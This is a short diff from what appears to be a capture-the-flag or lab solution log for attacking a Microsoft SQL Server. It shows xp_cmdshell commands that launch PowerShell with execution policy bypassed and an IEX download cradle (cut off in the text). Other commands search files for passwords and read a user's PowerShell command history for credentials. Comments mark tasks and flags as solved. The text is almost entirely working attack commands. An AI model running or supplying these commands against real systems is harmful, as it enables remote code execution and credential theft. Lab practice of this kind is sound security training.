@@ -42,6 +42,8 @@ EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -Command "IEX (New-Object N
 
 EXEC xp_cmdshell 'findstr /i "password admin administrator credentials" C:\Users\[user]\Desktop\output.txt';
 
+EXEC xp_cmdshell 'type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\[Task 7].txt';
+
 # Task 7 solved.
 
 # Flag 1 solved.
